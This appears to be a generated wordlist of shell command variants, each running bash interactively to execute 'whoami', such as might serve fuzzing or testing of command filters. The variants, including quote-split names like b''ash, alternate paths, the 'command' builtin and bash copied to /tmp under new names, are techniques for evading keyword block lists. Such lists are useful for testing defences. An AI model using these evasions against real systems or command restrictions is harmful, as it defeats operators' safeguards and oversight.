"bash"  -i -c "whoami"
"bash" -i -c "whoami"
"bash"-i -c "whoami"
'bash'  -i -c "whoami"
'bash' -i -c "whoami"
'bash'-i -c "whoami"
/bin/"bash"  -i -c "whoami"
/bin/"bash" -i -c "whoami"
/bin/"bash"-i -c "whoami"
/bin/'bash'  -i -c "whoami"
/bin/'bash' -i -c "whoami"
/bin/'bash'-i -c "whoami"
/bin/b""ash  -i -c "whoami"
/bin/b""ash -i -c "whoami"
/bin/b""ash-i -c "whoami"
/bin/b''ash  -i -c "whoami"
/bin/b''ash -i -c "whoami"
/bin/b''ash-i -c "whoami"
/bin/bash  -i -c "whoami"
/bin/bash -i -c "whoami"
/bin/bash-i -c "whoami"
/usr/bin/"bash"  -i -c "whoami"
/usr/bin/"bash" -i -c "whoami"
/usr/bin/"bash"-i -c "whoami"
/usr/bin/'bash'  -i -c "whoami"
/usr/bin/'bash' -i -c "whoami"
/usr/bin/'bash'-i -c "whoami"
/usr/bin/b""ash  -i -c "whoami"
/usr/bin/b""ash -i -c "whoami"
/usr/bin/b""ash-i -c "whoami"
/usr/bin/b''ash  -i -c "whoami"
/usr/bin/b''ash -i -c "whoami"
/usr/bin/b''ash-i -c "whoami"
/usr/bin/bash  -i -c "whoami"
/usr/bin/bash -i -c "whoami"
/usr/bin/bash-i -c "whoami"
b""ash  -i -c "whoami"
b""ash -i -c "whoami"
b""ash-i -c "whoami"
b''ash  -i -c "whoami"
b''ash -i -c "whoami"
b''ash-i -c "whoami"
bash  -i -c "whoami"
bash -i -c "whoami"
bash-i -c "whoami"
command "bash"  -i -c "whoami"
command "bash" -i -c "whoami"
command "bash"-i -c "whoami"
command 'bash'  -i -c "whoami"
command 'bash' -i -c "whoami"
command 'bash'-i -c "whoami"
command b""ash  -i -c "whoami"
command b""ash -i -c "whoami"
command b""ash-i -c "whoami"
command b''ash  -i -c "whoami"
command b''ash -i -c "whoami"
command b''ash-i -c "whoami"
command bash  -i -c "whoami"
command bash -i -c "whoami"
command bash-i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_131 && /tmp/tmp_bin_131 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_132 && /tmp/tmp_bin_132 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_133 && /tmp/tmp_bin_133 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_134 && /tmp/tmp_bin_134 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_135 && /tmp/tmp_bin_135 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_136 && /tmp/tmp_bin_136 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_137 && /tmp/tmp_bin_137 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_138 && /tmp/tmp_bin_138 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_139 && /tmp/tmp_bin_139 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_14 && /tmp/tmp_bin_14 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_140 && /tmp/tmp_bin_140 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_141 && /tmp/tmp_bin_141 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_142 && /tmp/tmp_bin_142 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_143 && /tmp/tmp_bin_143 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_144 && /tmp/tmp_bin_144 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_145 && /tmp/tmp_bin_145 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_146 && /tmp/tmp_bin_146 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_147 && /tmp/tmp_bin_147 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_148 && /tmp/tmp_bin_148 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_149 && /tmp/tmp_bin_149 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_15 && /tmp/tmp_bin_15 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_150 && /tmp/tmp_bin_150 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_151 && /tmp/tmp_bin_151 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_152 && /tmp/tmp_bin_152 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_153 && /tmp/tmp_bin_153 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_154 && /tmp/tmp_bin_154 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_155 && /tmp/tmp_bin_155 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_156 && /tmp/tmp_bin_156 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_157 && /tmp/tmp_bin_157 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_158 && /tmp/tmp_bin_158 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_159 && /tmp/tmp_bin_159 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_16 && /tmp/tmp_bin_16 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_160 && /tmp/tmp_bin_160 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_161 && /tmp/tmp_bin_161 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_162 && /tmp/tmp_bin_162 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_163 && /tmp/tmp_bin_163 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_164 && /tmp/tmp_bin_164 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_165 && /tmp/tmp_bin_165 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_166 && /tmp/tmp_bin_166 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_167 && /tmp/tmp_bin_167 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_168 && /tmp/tmp_bin_168 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_169 && /tmp/tmp_bin_169 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_17 && /tmp/tmp_bin_17 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_170 && /tmp/tmp_bin_170 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_171 && /tmp/tmp_bin_171 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_172 && /tmp/tmp_bin_172 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_173 && /tmp/tmp_bin_173 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_174 && /tmp/tmp_bin_174 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_175 && /tmp/tmp_bin_175 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_176 && /tmp/tmp_bin_176 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_177 && /tmp/tmp_bin_177 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_178 && /tmp/tmp_bin_178 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_179 && /tmp/tmp_bin_179 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_18 && /tmp/tmp_bin_18 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_180 && /tmp/tmp_bin_180 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_181 && /tmp/tmp_bin_181 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_182 && /tmp/tmp_bin_182 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_183 && /tmp/tmp_bin_183 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_184 && /tmp/tmp_bin_184 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_185 && /tmp/tmp_bin_185 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_186 && /tmp/tmp_bin_186 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_187 && /tmp/tmp_bin_187 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_188 && /tmp/tmp_bin_188 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_189 && /tmp/tmp_bin_189 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_19 && /tmp/tmp_bin_19 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_190 && /tmp/tmp_bin_190 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_191 && /tmp/tmp_bin_191 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_192 && /tmp/tmp_bin_192 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_193 && /tmp/tmp_bin_193 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_194 && /tmp/tmp_bin_194 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_195 && /tmp/tmp_bin_195 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_196 && /tmp/tmp_bin_196 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_197 && /tmp/tmp_bin_197 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_198 && /tmp/tmp_bin_198 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_199 && /tmp/tmp_bin_199 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_2 && /tmp/tmp_bin_2 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_20 && /tmp/tmp_bin_20 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_200 && /tmp/tmp_bin_200 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_201 && /tmp/tmp_bin_201 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_202 && /tmp/tmp_bin_202 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_203 && /tmp/tmp_bin_203 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_204 && /tmp/tmp_bin_204 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_205 && /tmp/tmp_bin_205 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_206 && /tmp/tmp_bin_206 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_207 && /tmp/tmp_bin_207 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_208 && /tmp/tmp_bin_208 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_209 && /tmp/tmp_bin_209 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_21 && /tmp/tmp_bin_21 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_210 && /tmp/tmp_bin_210 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_211 && /tmp/tmp_bin_211 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_212 && /tmp/tmp_bin_212 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_213 && /tmp/tmp_bin_213 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_214 && /tmp/tmp_bin_214 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_215 && /tmp/tmp_bin_215 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_216 && /tmp/tmp_bin_216 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_217 && /tmp/tmp_bin_217 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_218 && /tmp/tmp_bin_218 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_219 && /tmp/tmp_bin_219 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_22 && /tmp/tmp_bin_22 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_220 && /tmp/tmp_bin_220 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_221 && /tmp/tmp_bin_221 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_222 && /tmp/tmp_bin_222 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_223 && /tmp/tmp_bin_223 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_224 && /tmp/tmp_bin_224 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_225 && /tmp/tmp_bin_225 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_226 && /tmp/tmp_bin_226 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_227 && /tmp/tmp_bin_227 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_228 && /tmp/tmp_bin_228 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_229 && /tmp/tmp_bin_229 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_23 && /tmp/tmp_bin_23 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_230 && /tmp/tmp_bin_230 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_231 && /tmp/tmp_bin_231 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_232 && /tmp/tmp_bin_232 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_233 && /tmp/tmp_bin_233 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_234 && /tmp/tmp_bin_234 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_235 && /tmp/tmp_bin_235 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_236 && /tmp/tmp_bin_236 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_237 && /tmp/tmp_bin_237 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_238 && /tmp/tmp_bin_238 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_239 && /tmp/tmp_bin_239 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_24 && /tmp/tmp_bin_24 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_240 && /tmp/tmp_bin_240 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_241 && /tmp/tmp_bin_241 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_242 && /tmp/tmp_bin_242 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_243 && /tmp/tmp_bin_243 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_244 && /tmp/tmp_bin_244 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_245 && /tmp/tmp_bin_245 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_246 && /tmp/tmp_bin_246 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_247 && /tmp/tmp_bin_247 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_248 && /tmp/tmp_bin_248 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_249 && /tmp/tmp_bin_249 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_25 && /tmp/tmp_bin_25 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_250 && /tmp/tmp_bin_250 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_251 && /tmp/tmp_bin_251 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_252 && /tmp/tmp_bin_252 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_253 && /tmp/tmp_bin_253 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_254 && /tmp/tmp_bin_254 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_26 && /tmp/tmp_bin_26 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_27 && /tmp/tmp_bin_27 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_28 && /tmp/tmp_bin_28 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_29 && /tmp/tmp_bin_29 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_3 && /tmp/tmp_bin_3 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_30 && /tmp/tmp_bin_30 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_31 && /tmp/tmp_bin_31 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_32 && /tmp/tmp_bin_32 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_33 && /tmp/tmp_bin_33 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_34 && /tmp/tmp_bin_34 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_35 && /tmp/tmp_bin_35 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_36 && /tmp/tmp_bin_36 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_37 && /tmp/tmp_bin_37 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_38 && /tmp/tmp_bin_38 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_39 && /tmp/tmp_bin_39 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_4 && /tmp/tmp_bin_4 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_40 && /tmp/tmp_bin_40 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_41 && /tmp/tmp_bin_41 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_42 && /tmp/tmp_bin_42 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_43 && /tmp/tmp_bin_43 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_44 && /tmp/tmp_bin_44 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_45 && /tmp/tmp_bin_45 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_46 && /tmp/tmp_bin_46 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_47 && /tmp/tmp_bin_47 -i -c "whoami"
